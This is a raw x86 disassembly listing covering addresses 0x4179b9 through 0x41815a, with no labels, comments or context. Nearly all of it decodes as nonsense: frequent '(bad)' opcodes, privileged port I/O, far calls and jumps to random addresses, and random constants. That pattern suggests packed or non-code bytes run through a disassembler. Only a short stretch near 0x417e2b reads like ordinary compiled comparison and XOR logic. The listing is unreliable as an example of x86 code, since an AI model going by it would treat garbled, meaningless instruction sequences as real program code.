  4179b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179ba:	retf   
  4179bb:	xchg   ebx,eax
  4179bc:	loope  0x4179b3
  4179be:	sub    al,0xae
  4179c0:	loop   0x41795e
  4179c2:	test   edi,0x8eed56c0
  4179c8:	jmp    0x9acd29f3
  4179cd:	xrelease mov DWORD PTR [edi+0x141c255e],esp
  4179d4:	stos   BYTE PTR es:[edi],al
  4179d5:	and    DWORD PTR [eax-0xd],eax
  4179d8:	sbb    al,0x4f
  4179da:	mov    eax,ds:0x548dcf57
  4179df:	pop    edx
  4179e0:	je     0x4179fb
  4179e2:	ret    0xc888
  4179e5:	xor    DWORD PTR [ebp+0xfa16fa3],esp
  4179eb:	push   ds
  4179ec:	cmp    al,BYTE PTR [edx-0x4d4f33a1]
  4179f2:	fld    QWORD PTR [esp+ebx*2-0x7cae2aac]
  4179f9:	push   0x3e1a283c
  4179fe:	ins    DWORD PTR es:[edi],dx
  4179ff:	cld    
  417a00:	xlat   BYTE PTR ds:[ebx]
  417a01:	inc    esi
  417a02:	aas    
  417a03:	add    dh,dl
  417a05:	lea    ebp,[edi+0x318573f5]
  417a0b:	(bad)  
  417a0c:	mov    bh,0x76
  417a0e:	es sbb al,dl
  417a11:	cmp    cl,bl
  417a13:	js     0x417a3a
  417a15:	ja     0x4179fc
  417a17:	pop    esi
  417a18:	mov    bh,0xb5
  417a1a:	sbb    bl,BYTE PTR [eax-0x24]
  417a1d:	dec    eax
  417a1e:	nop
  417a1f:	inc    edx
  417a20:	repnz gs imul edx,edi,0xffffff92
  417a25:	shl    BYTE PTR [ebx+ecx*4],0x19
  417a29:	and    eax,0x38db5cf8
  417a2e:	mov    ecx,0xadb047e0
  417a33:	mov    edi,0xfd789a53
  417a38:	cmp    al,BYTE PTR fs:[ebp-0x2a]
  417a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a3d:	pusha  
  417a3e:	(bad)  
  417a3f:	push   esi
  417a40:	xchg   edi,eax
  417a41:	imul   edi,DWORD PTR [ecx+0x5],0xb075a26d
  417a48:	shl    DWORD PTR [eax+0x55bdd6d8],1
  417a4e:	call   0x4336e3de
  417a53:	lods   eax,DWORD PTR ds:[esi]
  417a54:	jno    0x417a8b
  417a56:	xchg   esp,eax
  417a57:	adc    BYTE PTR [ecx+edx*2-0x71],bh
  417a5b:	xor    eax,0x57218a4
  417a60:	jmp    0x417a9c
  417a62:	push   ds
  417a63:	xchg   edx,eax
  417a64:	jecxz  0x417ae1
  417a66:	js     0x417a36
  417a68:	jb     0x417aa1
  417a6a:	sbb    eax,0xb4b90365
  417a6f:	dec    edi
  417a70:	push   ecx
  417a71:	cli    
  417a72:	test   al,0x8a
  417a75:	loop   0x417af6
  417a77:	adc    al,0x20
  417a79:	in     eax,dx
  417a7a:	push   ss
  417a7b:	stos   DWORD PTR es:[edi],eax
  417a7c:	int    0x7f
  417a7e:	push   ebx
  417a7f:	pop    ss
  417a80:	mov    BYTE PTR [eax],ch
  417a82:	inc    esi
  417a83:	int    0xf9
  417a85:	and    eax,0xf57a2c64
  417a8a:	in     al,dx
  417a8b:	cmp    eax,0x6fe00e78
  417a90:	mul    DWORD PTR [esi+0x52cf5f10]
  417a96:	imul   ecx,edi,0x55f35b85
  417a9c:	lahf   
  417a9d:	(bad)  [esi]
  417a9f:	lock inc esi
  417aa1:	pop    edx
  417aa2:	mov    ch,0x7
  417aa4:	stos   BYTE PTR es:[edi],al
  417aa5:	fimul  DWORD PTR [eax]
  417aa7:	aas    
  417aa8:	adc    eax,0xc59682f
  417aad:	test   esp,edx
  417aaf:	sbb    BYTE PTR [eax-0x18],0xca
  417ab3:	add    ebp,DWORD PTR [ecx]
  417ab5:	sub    eax,eax
  417ab7:	lea    eax,[eax+0x17]
  417aba:	lods   al,BYTE PTR ds:[esi]
  417abb:	hlt    
  417abc:	js     0x417a4e
  417abe:	sbb    DWORD PTR [edi],esi
  417ac0:	arpl   WORD PTR [ebx],ax
  417ac2:	hlt    
  417ac3:	bnd ds jge 0x417a98
  417ac7:	fs mov al,0x8f
  417aca:	adc    ebx,DWORD PTR [esi]
  417acc:	sub    al,0x3c
  417ace:	int3   
  417acf:	aad    0x96
  417ad1:	inc    edx
  417ad2:	inc    edx
  417ad3:	sbb    ch,BYTE PTR [eax-0x13]
  417ad6:	xchg   ebx,esi
  417ad8:	popf   
  417ad9:	mov    dh,0x25
  417adb:	loope  0x417ace
  417add:	xchg   esi,eax
  417ade:	mov    ah,0x14
  417ae0:	cmp    eax,0xf864d124
  417ae5:	out    dx,al
  417ae6:	jp     0x417b57
  417ae8:	adc    ecx,esi
  417aea:	xor    al,0x26
  417aec:	in     al,0x61
  417aee:	dec    ecx
  417aef:	pop    ebx
  417af0:	and    eax,0xaaeb34a5
  417af5:	leave  
  417af6:	aas    
  417af7:	sub    eax,esi
  417af9:	icebp  
  417afa:	imul   ebx,DWORD PTR [edi],0xffffffdb
  417afd:	int    0xd5
  417aff:	test   al,0x6d
  417b01:	lods   eax,DWORD PTR ds:[esi]
  417b02:	jp     0x417afd
  417b04:	jle    0x417b3b
  417b06:	ins    BYTE PTR es:[edi],dx
  417b07:	je     0x417b40
  417b09:	jb     0x417ac0
  417b0b:	add    al,0xf6
  417b0d:	icebp  
  417b0e:	(bad)  
  417b0f:	sti    
  417b10:	cli    
  417b11:	outs   dx,DWORD PTR ds:[esi]
  417b12:	in     al,dx
  417b13:	dec    esp
  417b14:	dec    ecx
  417b15:	js     0x417b94
  417b17:	fistp  DWORD PTR ds:0x2c57f260
  417b1d:	push   ebx
  417b1e:	jbe    0x417b83
  417b20:	ret    0x4b58
  417b23:	jne    0x417ad0
  417b25:	dec    ebp
  417b26:	jecxz  0x417b5b
  417b28:	(bad)  
  417b29:	mov    ds:0xaa317502,eax
  417b2e:	ror    BYTE PTR [eax],1
  417b30:	xchg   edi,eax
  417b31:	xlat   BYTE PTR ds:[ebx]
  417b32:	ret    0x6691
  417b35:	pusha  
  417b36:	imul   esi,DWORD PTR [esp+edi*8+0x4d],0xffffff99
  417b3b:	mov    dh,0x35
  417b3d:	retf   0x2a37
  417b40:	out    0x81,al
  417b42:	jns    0x417b5c
  417b44:	mov    edx,0xcbba1277
  417b49:	xchg   esi,eax
  417b4a:	loop   0x417ae2
  417b4c:	cmc    
  417b4d:	aad    0xd2
  417b4f:	inc    ecx
  417b50:	call   0x9ee98907
  417b55:	add    ebx,DWORD PTR [edi+0x1e5852fc]
  417b5b:	lea    edx,[edx]
  417b5d:	lahf   
  417b5e:	jl     0x417bd6
  417b60:	mov    WORD PTR [edx+0x36ee2800],ds
  417b66:	adc    dl,BYTE PTR [ecx+0x4d]
  417b69:	in     al,0x67
  417b6b:	fwait
  417b6c:	test   BYTE PTR [edi+0x3175e1e],al
  417b72:	aas    
  417b73:	out    0x5c,eax
  417b75:	mov    BYTE PTR [edx-0x28],0x46
  417b79:	ret    
  417b7a:	and    DWORD PTR [ecx+0x31803e2],eax
  417b80:	mov    al,0x89
  417b82:	xchg   ebx,eax
  417b83:	pop    eax
  417b84:	scas   al,BYTE PTR es:[edi]
  417b85:	cmp    DWORD PTR [ebx+0x5727a074],ebp
  417b8b:	fidivr DWORD PTR [eax]
  417b8d:	cmp    BYTE PTR [edi],dh
  417b8f:	adc    DWORD PTR [esi+0x54],edi
  417b92:	mov    ebx,0xfd7248d0
  417b97:	push   0x7f376825
  417b9c:	cmc    
  417b9d:	sub    DWORD PTR [edi+ebp*2],esp
  417ba0:	outs   dx,BYTE PTR ds:[esi]
  417ba1:	pop    eax
  417ba2:	mov    al,0xbe
  417ba4:	push   edi
  417ba5:	sbb    esi,0xffffff84
  417ba8:	mov    eax,ds:0x3519ae6d
  417bad:	and    dh,cl
  417baf:	daa    
  417bb0:	jae    0x417b48
  417bb2:	push   ebp
  417bb3:	inc    esp
  417bb4:	lods   al,BYTE PTR ds:[esi]
  417bb5:	xchg   ecx,eax
  417bb6:	xchg   ebp,eax
  417bb7:	xor    DWORD PTR [esi+ebx*4+0x44],0x3c
  417bbc:	mov    edi,0x37045a1a
  417bc1:	or     BYTE PTR [edx-0xa],al
  417bc4:	cmp    DWORD PTR [ecx+0x5af263bb],ebx
  417bca:	aaa    
  417bcb:	and    DWORD PTR [ecx],edx
  417bcd:	dec    edi
  417bce:	pop    esp
  417bcf:	(bad)  
  417bd0:	or     ebx,eax
  417bd2:	mov    eax,0x52381d73
  417bd7:	(bad)  
  417bd8:	fcmovnbe st,st(4)
  417bda:	(bad)
  417bdf:	cdq    
  417be0:	dec    ecx
  417be1:	daa    
  417be2:	xchg   ecx,eax
  417be3:	inc    ebx
  417be4:	mov    dh,0xf4
  417be6:	jbe    0x417bf4
  417be8:	dec    esp
  417be9:	sbb    al,BYTE PTR [esi]
  417beb:	out    dx,al
  417bec:	sub    al,0x51
  417bee:	gs loope 0x417b8e
  417bf1:	fwait
  417bf2:	pop    ebx
  417bf3:	sbb    DWORD PTR [ebx],eax
  417bf5:	inc    eax
  417bf6:	pop    esp
  417bf7:	xchg   BYTE PTR [ebx],al
  417bf9:	sbb    edx,DWORD PTR [eax+edx*1-0xd]
  417bfd:	(bad)  
  417bfe:	mov    dl,0x87
  417c00:	leave  
  417c01:	jmp    0x417bc7
  417c03:	mov    fs,WORD PTR [edi+0x57]
  417c06:	test   al,0x2f
  417c08:	addr16 out 0x78,al
  417c0b:	addr16 sbb ebx,0xdf523f63
  417c12:	dec    eax
  417c13:	pop    DWORD PTR [edi+0x21]
  417c16:	adc    dl,dh
  417c18:	lea    esp,[eax+0x6e71a67e]
  417c1e:	mov    al,BYTE PTR [ebp-0x534e469]
  417c24:	imul   ebp,DWORD PTR [ebx+0x26],0x3f0f675f
  417c2b:	jne    0x417c3b
  417c2d:	pop    ebp
  417c2e:	outs   dx,BYTE PTR ds:[esi]
  417c2f:	(bad)  
  417c30:	jmp    0x417bc8
  417c32:	or     bl,dh
  417c34:	jl     0x417c1b
  417c36:	cmp    BYTE PTR [esi+0x64],dh
  417c39:	sub    al,0x7c
  417c3b:	daa    
  417c3c:	push   ds
  417c3d:	jecxz  0x417c1c
  417c3f:	adc    BYTE PTR [edx],0xe7
  417c42:	outs   dx,DWORD PTR ds:[esi]
  417c43:	fiadd  DWORD PTR [eax+0x77]
  417c46:	and    eax,0x9e0ca1a9
  417c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c4c:	imul   eax,DWORD PTR [edx],0xffffffce
  417c4f:	inc    esi
  417c50:	(bad)
  417c54:	cmc    
  417c55:	(bad)  
  417c56:	in     al,0x5f
  417c58:	sub    cl,BYTE PTR [eax+0x42]
  417c5b:	das    
  417c5c:	loope  0x417c01
  417c5e:	sub    ah,BYTE PTR [edi+0x21c81f33]
  417c64:	and    al,0x40
  417c66:	scas   al,BYTE PTR es:[edi]
  417c67:	xchg   esp,eax
  417c68:	sahf   
  417c69:	cmp    BYTE PTR [edi-0x2f0c61de],cl
  417c6f:	outs   dx,DWORD PTR ds:[esi]
  417c70:	je     0x417ce9
  417c72:	pop    ecx
  417c73:	mov    ecx,0xcf7e97a7
  417c78:	mov    edx,0x3a702eda
  417c7d:	sbb    edx,esp
  417c7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c80:	mov    eax,ds:0x40f41415
  417c85:	adc    BYTE PTR [eax],dh
  417c87:	jnp    0x417c29
  417c89:	or     eax,0x701fb6e4
  417c8e:	aam    0x25
  417c90:	les    eax,FWORD PTR ds:0xc4d62b6d
  417c96:	mov    eax,ds:0xa8a12fa0
  417c9b:	and    eax,0x5ae98747
  417ca0:	push   ecx
  417ca1:	mov    dl,al
  417ca3:	call   0xae03:0x80e0b8b0
  417caa:	mov    BYTE PTR [eax-0x3511b70f],al
  417cb0:	cld    
  417cb1:	or     eax,0xea250ee5
  417cb6:	jbe    0x417cb9
  417cb8:	ucomiss xmm2,DWORD PTR [edx+0x28f8e6c8]
  417cbf:	adc    esp,eax
  417cc1:	cmp    BYTE PTR [ebp+0x1fb7e265],0xc3
  417cc8:	xlat   BYTE PTR ds:[ebx]
  417cc9:	test   DWORD PTR [ebx+esi*8],ebx
  417ccc:	sub    eax,0x5dfb9cd3
  417cd1:	pop    ecx
  417cd2:	mov    cs,WORD PTR [eax]
  417cd4:	iret   
  417cd5:	pop    ebx
  417cd6:	or     al,0x6
  417cd8:	cmp    eax,0xc204b8f1
  417cdd:	lock mov ebx,0x43413b05
  417ce3:	or     DWORD PTR [ecx-0x66],edx
  417ce6:	jb     0x417d53
  417ce8:	or     BYTE PTR [eax+ebx*4-0x3b5b3058],0xe8
  417cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cf1:	sbb    dl,BYTE PTR [esi-0x39edb096]
  417cf7:	add    DWORD PTR [ecx],esi
  417cf9:	shr    DWORD PTR [edi-0x786e4bf6],cl
  417cff:	jecxz  0x417c8b
  417d01:	push   es
  417d02:	test   eax,0xe7f7fa78
  417d07:	adc    al,0xd2
  417d09:	pop    ecx
  417d0a:	xor    DWORD PTR [eax+eiz*8-0x60],edx
  417d0e:	into   
  417d0f:	sub    al,BYTE PTR [ebx+esi*1-0x2db88093]
  417d16:	int3   
  417d17:	xor    al,0xe1
  417d19:	fnstenv [edx]
  417d1b:	repnz mov ecx,0xbe18ce77
  417d21:	mov    WORD PTR [edx+0x52437a91],fs
  417d27:	mov    esp,0xf1a8cd7a
  417d2c:	xor    ah,BYTE PTR [edi-0x2fb251e0]
  417d32:	rol    DWORD PTR [ecx-0x15d49b74],1
  417d38:	gs cli 
  417d3a:	and    DWORD PTR [ecx-0x6763fae2],0x5f
  417d41:	pop    esi
  417d42:	pusha  
  417d43:	adc    DWORD PTR [ecx-0x62],ecx
  417d46:	dec    edx
  417d47:	cwde   
  417d48:	add    al,0xda
  417d4a:	aam    0xe6
  417d4c:	ss xor al,0xb7
  417d4f:	mov    ah,0x9c
  417d51:	inc    esi
  417d52:	mov    dl,0x73
  417d54:	mov    ds:0x3ed6b4b3,eax
  417d59:	and    al,0x8e
  417d5b:	mov    edi,DWORD PTR [edi+0x57]
  417d5e:	out    0x7c,eax
  417d60:	xor    DWORD PTR [edi+0x546215ac],edx
  417d66:	xor    eax,DWORD PTR [edi+eax*1-0x744e8a5f]
  417d6d:	jl     0x417da0
  417d6f:	pop    esp
  417d70:	push   esp
  417d71:	xor    al,0xe5
  417d73:	(bad)  
  417d74:	inc    esp
  417d75:	int    0xa6
  417d77:	mov    al,ds:0xd9dc5466
  417d7c:	call   0x2d8b:0x7d1becbf
  417d83:	jae    0x417d9c
  417d85:	push   ds
  417d86:	adc    esp,ebx
  417d88:	iret   
  417d89:	hlt    
  417d8a:	out    dx,al
  417d8b:	or     eax,0x51e158fc
  417d90:	inc    esi
  417d91:	mul    ch
  417d93:	fmul   QWORD PTR [esi-0x741c8c70]
  417d99:	xlat   BYTE PTR ds:[ebx]
  417d9a:	inc    ecx
  417d9b:	jl     0x417de0
  417d9d:	adc    edx,DWORD PTR [ebp-0x13b7ab24]
  417da3:	frstor [ebx-0x66]
  417da6:	outs   dx,BYTE PTR ds:[esi]
  417da7:	inc    eax
  417da8:	sbb    ch,bh
  417daa:	sbb    al,0xb5
  417dac:	stos   BYTE PTR es:[edi],al
  417dad:	push   cs
  417dae:	add    DWORD PTR [eax],0x45
  417db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417db2:	sbb    BYTE PTR [edi-0x4f],ch
  417db5:	mov    bh,cl
  417db7:	scas   eax,DWORD PTR es:[edi]
  417db8:	inc    ebp
  417db9:	dec    ebx
  417dba:	das    
  417dbb:	push   ss
  417dbc:	add    eax,0xdab457d0
  417dc1:	sbb    eax,0x59806d4a
  417dc6:	scas   al,BYTE PTR es:[edi]
  417dc7:	daa    
  417dc8:	xchg   ecx,eax
  417dc9:	sbb    DWORD PTR [esi],0xffffffaa
  417dcc:	xor    DWORD PTR [ebp+0x58960122],ebp
  417dd2:	inc    ebx
  417dd3:	rcl    DWORD PTR [ebx],0x1
  417dd6:	inc    edx
  417dd7:	add    BYTE PTR [eax],ah
  417dd9:	(bad)  
  417dda:	out    0xc9,eax
  417ddc:	xchg   ebx,eax
  417ddd:	mov    ah,BYTE PTR [ebx+0x71]
  417de0:	jne    0x417e06
  417de2:	lock mov al,ds:0xa14c387f
  417de8:	bound  esp,QWORD PTR [ecx]
  417dea:	xchg   ecx,eax
  417deb:	out    0x28,al
  417ded:	aam    0x67
  417def:	icebp  
  417df0:	jmp    0x417d8d
  417df2:	cmp    eax,0x1375b65c
  417df7:	or     DWORD PTR [ebx],0xf07f9694
  417dfd:	addr16 pop ecx
  417dff:	int3   
  417e00:	imul   eax,DWORD PTR [edi-0x66f8a3e7],0x67
  417e07:	out    0x7d,al
  417e09:	push   ss
  417e0a:	int3   
  417e0b:	add    eax,0xf7ffab07
  417e10:	push   ss
  417e11:	aas    
  417e12:	lahf   
  417e13:	or     al,0x6
  417e15:	mov    al,ds:0xf772c80
  417e1a:	cmp    ah,BYTE PTR [esi]
  417e1c:	out    dx,al
  417e1d:	shl    DWORD PTR [edi],1
  417e1f:	hlt    
  417e20:	je     0x417e5b
  417e22:	jmp    0x417e2d
  417e24:	xor    al,0x65
  417e26:	or     al,0xfc
  417e28:	xchg   ebp,eax
  417e29:	xlat   BYTE PTR ds:[ebx]
  417e2a:	popa   
  417e2b:	mov    ecx,DWORD PTR [ebp-0x20]
  417e2e:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  417e35:	mov    edx,DWORD PTR [ebp+0xc]
  417e38:	cmp    cl,BYTE PTR [edx]
  417e3a:	jne    0x420de3
  417e40:	mov    ecx,DWORD PTR [ebp-0x14]
  417e43:	mov    edx,DWORD PTR [ebp+0xc]
  417e46:	movsx  edx,BYTE PTR [edx]
  417e49:	xor    ecx,eax
  417e4b:	add    ecx,esi
  417e4d:	jmp    0x41a1da
  417e52:	cmp    DWORD PTR [ecx],ecx
  417e54:	mov    ebp,0x79c6ad42
  417e59:	stc    
  417e5a:	mov    DWORD PTR [ebp-0x58],edi
  417e5d:	fstp   DWORD PTR [eax-0x42]
  417e60:	daa    
  417e61:	mov    bh,0xde
  417e63:	cmp    BYTE PTR [ebp+0x7a],bh
  417e66:	or     bl,BYTE PTR [edi+0x7a]
  417e69:	jp     0x417eae
  417e6b:	xor    al,0x11
  417e6d:	jmp    0xa46ed68b
  417e72:	mov    dh,0x7a
  417e74:	mov    ah,0x60
  417e76:	je     0x417ec0
  417e78:	xchg   edi,eax
  417e79:	rol    DWORD PTR [esi],0xfe
  417e7c:	cmc    
  417e7d:	mov    ecx,edx
  417e7f:	std    
  417e80:	cdq    
  417e81:	cli    
  417e82:	mov    dl,0xa6
  417e84:	mov    ebp,0x23909f2d
  417e89:	jns    0x417e4e
  417e8b:	dec    edx
  417e8c:	(bad)  
  417e8d:	pop    ds
  417e8e:	push   ecx
  417e8f:	(bad)  
  417e90:	fdiv   QWORD PTR [ebx]
  417e92:	or     DWORD PTR [esp+esi*4],ecx
  417e95:	aaa    
  417e96:	mov    ah,BYTE PTR [ebp+0x308443dd]
  417e9c:	jns    0x417e99
  417e9e:	cmp    al,0x40
  417ea0:	ret    
  417ea1:	ins    DWORD PTR es:[edi],dx
  417ea2:	rcr    BYTE PTR [ecx],cl
  417ea4:	fnstcw WORD PTR [edx]
  417ea6:	lea    ebp,[ebx+0x23]
  417ea9:	out    dx,eax
  417eaa:	mov    eax,ds:0x82a1ec7
  417eb0:	aad    0x78
  417eb2:	mov    ds:0xe50bf4e2,al
  417eb7:	jne    0x417eb3
  417eb9:	fistp  DWORD PTR [esi-0x5d]
  417ebc:	pusha  
  417ebd:	pop    ss
  417ebe:	xchg   esi,eax
  417ebf:	fisub  DWORD PTR [esi-0x3a6f81c2]
  417ec5:	push   esi
  417ec6:	jo     0x417e63
  417ec8:	bound  ebp,QWORD PTR [esi+0x57]
  417ecb:	test   eax,0x97fce831
  417ed0:	sbb    eax,0x3aa82e37
  417ed5:	hlt    
  417ed6:	fcomp  DWORD PTR [esp+ecx*1+0xc79b7ad]
  417edd:	add    al,dl
  417edf:	xor    eax,0x12198070
  417ee4:	add    DWORD PTR [esi],eax
  417ee6:	call   0xaf2832bf
  417eeb:	jno    0x417e8c
  417eed:	loop   0x417ecf
  417eef:	and    eax,0x6765af39
  417ef4:	and    BYTE PTR [ebx+0x16],cl
  417ef7:	xchg   ebp,eax
  417ef8:	in     al,0x8b
  417efa:	lea    ebp,[esp+ecx*4]
  417efd:	xlat   BYTE PTR ds:[ebx]
  417efe:	jecxz  0x417e9c
  417f00:	stos   BYTE PTR es:[edi],al
  417f01:	add    edi,DWORD PTR [esi+0x22]
  417f04:	mov    dl,0x32
  417f06:	mov    ebx,0x52347a7b
  417f0b:	mov    ds:0xb59a2820,eax
  417f10:	mov    bh,0x4f
  417f12:	xchg   esp,eax
  417f13:	add    eax,0x4234aa6e
  417f18:	retf   0x6c56
  417f1b:	sub    eax,0xffaa5bfd
  417f20:	pop    ecx
  417f21:	xor    dl,cl
  417f23:	pop    eax
  417f24:	and    DWORD PTR [esi-0x7502bad0],0xffffff8f
  417f2b:	add    edx,DWORD PTR [ebx+ebp*1+0x17]
  417f2f:	(bad)  
  417f31:	addr16 ret 0x64eb
  417f35:	jecxz  0x417f53
  417f37:	dec    edi
  417f38:	xor    DWORD PTR [edi-0x2c],esp
  417f3b:	jmp    0x417ec7
  417f3d:	ja     0x417fae
  417f3f:	ds mov dh,0xbe
  417f42:	dec    eax
  417f43:	xlat   BYTE PTR ds:[ebx]
  417f44:	or     cl,BYTE PTR ds:0xb71e33f6
  417f4a:	sub    eax,0xc8dbdd28
  417f4f:	and    DWORD PTR [esi-0xa],eax
  417f52:	pop    ecx
  417f53:	in     eax,0x1b
  417f55:	aam    0xce
  417f57:	ds adc al,0x1f
  417f5a:	mov    ss,WORD PTR [ebx+0x649b7066]
  417f60:	dec    eax
  417f61:	adc    al,0x7a
  417f63:	(bad)  
  417f64:	pop    ebx
  417f65:	(bad)  
  417f66:	icebp  
  417f67:	push   0x8f0d9f03
  417f6c:	push   ebp
  417f6d:	xchg   BYTE PTR [esi+0x3c],ah
  417f70:	mov    ecx,0x146dc24c
  417f75:	cmp    ch,ch
  417f77:	(bad)  
  417f78:	mov    ah,BYTE PTR [esi+0x19c4d10d]
  417f7e:	push   ds
  417f7f:	fistp  WORD PTR [eax+0x15d8907d]
  417f85:	push   cs
  417f86:	mov    eax,ds:0x9eae875
  417f8b:	int3   
  417f8c:	mov    WORD PTR [eax+0x3cad1524],?
  417f92:	test   DWORD PTR [edx-0x5a5f076a],ebp
  417f98:	aas    
  417f99:	jmp    0xd80132a3
  417f9e:	jbe    0x417fb9
  417fa0:	xchg   BYTE PTR [ebp-0x4a],bh
  417fa3:	data16 or al,0x17
  417fa6:	inc    edx
  417fa7:	or     dh,ch
  417fa9:	inc    edi
  417faa:	sar    dh,cl
  417fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fad:	dec    ecx
  417fae:	pop    edx
  417faf:	mov    ebx,0x6649c7b6
  417fb4:	and    esi,esi
  417fb6:	mul    DWORD PTR [ebp+ecx*2-0x6bef2424]
  417fbd:	xchg   esi,eax
  417fbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fbf:	lock int 0x12
  417fc2:	dec    eax
  417fc3:	dec    ecx
  417fc4:	test   al,0xc0
  417fc7:	bound  ebp,QWORD PTR [edx]
  417fc9:	jmp    0x1816b192
  417fce:	cld    
  417fcf:	sub    DWORD PTR [ebp+0x78],ebx
  417fd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fd3:	xor    eax,0x982a4273
  417fd8:	push   ecx
  417fd9:	imul   edi,DWORD PTR [esi+0x22],0x29c717b3
  417fe0:	push   eax
  417fe1:	ins    BYTE PTR es:[edi],dx
  417fe2:	aad    0x87
  417fe4:	mov    DWORD PTR [edi+0x39],esi
  417fe7:	aas    
  417fe8:	mov    al,ds:0x55229ee3
  417fed:	jecxz  0x417fbc
  417fef:	call   0x6627:0xd977805c
  417ff6:	test   BYTE PTR [eax-0x77],0x81
  417ffa:	sahf   
  417ffb:	clc    
  417ffc:	inc    esi
  417ffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ffe:	push   0xfffffffd
  418000:	pop    ebx
  418001:	mov    ah,0x62
  418003:	push   edx
  418004:	(bad)  
  418006:	sub    BYTE PTR [ebx-0x72],dl
  418009:	xor    DWORD PTR [eax],esi
  41800b:	dec    edi
  41800c:	mov    ds:0x55bb944e,eax
  418011:	imul   edi,DWORD PTR [eax],0xe422c66c
  418017:	mov    edx,DWORD PTR [edi]
  418019:	cmp    al,0x29
  41801b:	add    ecx,DWORD PTR [ebp+0x15]
  41801e:	and    DWORD PTR [eax],0x45f43794
  418024:	xchg   DWORD PTR [ebx],ebx
  418026:	inc    edx
  418027:	mov    gs,WORD PTR [edi+0x49]
  41802a:	mov    eax,ds:0xb4f31410
  41802f:	mov    ds:0xc34082b6,eax
  418034:	pop    ebx
  418035:	and    eax,0x51dbddac
  41803a:	lahf   
  41803b:	outs   dx,DWORD PTR ds:[esi]
  41803c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41803d:	xor    DWORD PTR [ecx],edi
  41803f:	(bad)  
  418040:	jl     0x418001
  418042:	cdq    
  418043:	jg     0x417fd7
  418045:	ins    DWORD PTR es:[edi],dx
  418046:	jmp    0x418074
  418048:	xor    BYTE PTR [ecx+0x32],0xce
  41804c:	add    eax,0x366607df
  418051:	push   edx
  418052:	sub    esp,DWORD PTR [esi-0x4b3e8f75]
  418058:	mov    cs,WORD PTR [ecx-0x652056c0]
  41805e:	dec    ebx
  41805f:	in     al,0xf3
  418061:	(bad)  
  418062:	neg    BYTE PTR [esp+ebp*1+0x34e61dc0]
  418069:	mov    ds:0x7c885ca4,eax
  41806e:	je     0x4180b9
  418070:	mov    eax,ds:0x4f8874e9
  418075:	test   ecx,eax
  418077:	lock xchg esp,eax
  418079:	sub    edi,DWORD PTR [edx+eiz*8]
  41807c:	in     al,0x0
  41807e:	aad    0x6f
  418080:	xor    BYTE PTR [edi+edi*1],dl
  418083:	hlt    
  418084:	imul   edi,esi,0x8f38d7fc
  41808a:	pusha  
  41808b:	mov    ebp,0x1a0c15a9
  418090:	sti    
  418091:	mov    dh,0xd0
  418093:	popf   
  418094:	outs   dx,DWORD PTR ds:[esi]
  418095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418096:	jp     0x418105
  418098:	(bad)  
  41809a:	in     eax,dx
  41809b:	sbb    eax,0xddc9aa3f
  4180a0:	aaa    
  4180a1:	aam    0xba
  4180a3:	retf   
  4180a4:	inc    edi
  4180a5:	xchg   DWORD PTR [eax],edx
  4180a7:	(bad)  
  4180a8:	pushf  
  4180a9:	int    0xb9
  4180ab:	sub    WORD PTR [ecx],ax
  4180ae:	xor    al,0x32
  4180b0:	in     eax,0x91
  4180b2:	icebp  
  4180b3:	retf   0x872f
  4180b6:	retf   
  4180b7:	(bad)  
  4180b8:	(bad)  
  4180b9:	push   ecx
  4180ba:	dec    esi
  4180bb:	pop    ebp
  4180bc:	popa   
  4180bd:	fistp  QWORD PTR [esi]
  4180bf:	(bad)  
  4180c0:	pop    edx
  4180c1:	cmp    BYTE PTR [eax+0x50d522c0],bh
  4180c7:	cmp    bh,BYTE PTR [ecx+0x6c]
  4180ca:	mov    ah,0xf
  4180cc:	cdq    
  4180cd:	mov    al,ds:0x9567b3ea
  4180d2:	and    al,0xaf
  4180d4:	cmp    BYTE PTR [eax+ebx*1-0x4eb44d03],ah
  4180db:	stos   DWORD PTR es:[edi],eax
  4180dc:	dec    esp
  4180dd:	test   eax,0x9e30db9a
  4180e2:	test   BYTE PTR [eax+ebx*8],bl
  4180e5:	dec    ebp
  4180e6:	fld    TBYTE PTR [ecx-0x4e653190]
  4180ec:	pop    esi
  4180ed:	push   es
  4180ee:	sub    eax,0x8f915d40
  4180f3:	lods   al,BYTE PTR ds:[esi]
  4180f4:	fdiv   QWORD PTR [edi+esi*2-0x1e]
  4180f8:	pop    edx
  4180f9:	push   edx
  4180fa:	or     esi,DWORD PTR [esp+ecx*8+0x43]
  4180fe:	sub    eax,esp
  418100:	sbb    DWORD PTR [esi-0x7c],ebx
  418103:	addr16 push cs
  418105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418106:	push   cs
  418107:	shl    DWORD PTR [esi-0x17f4ff6a],0x0
  41810e:	inc    ebx
  41810f:	mov    edx,0x62e75f8
  418114:	push   esp
  418115:	cmp    esp,DWORD PTR [eax+0x3b]
  418118:	aad    0xa1
  41811a:	mov    cl,0xba
  41811c:	sub    edi,DWORD PTR [edi]
  41811e:	mov    dl,0xa9
  418120:	add    dh,0xba
  418123:	mov    esp,ecx
  418125:	out    0xa8,al
  418127:	or     al,0xa1
  418129:	or     eax,0x6726faa
  41812e:	in     eax,0x58
  418130:	outs   dx,DWORD PTR ds:[esi]
  418131:	sbb    ah,dh
  418133:	lahf   
  418134:	pop    ss
  418135:	pop    ebp
  418136:	jmp    DWORD PTR [esi]
  418138:	not    DWORD PTR [ebx+0x3b6acfa9]
  41813e:	stos   BYTE PTR es:[edi],al
  41813f:	rol    eax,cl
  418141:	and    BYTE PTR [esi-0x2aee92b8],ch
  418147:	ror    DWORD PTR [edx+ecx*4+0x72],1
  41814b:	ror    DWORD PTR [ebx+ecx*4-0x50],0x11
  418150:	lea    edi,[edx+0x195f19e3]
  418156:	jb     0x418109
  418158:	mov    bh,0xfb
  41815a:	inc    ebx
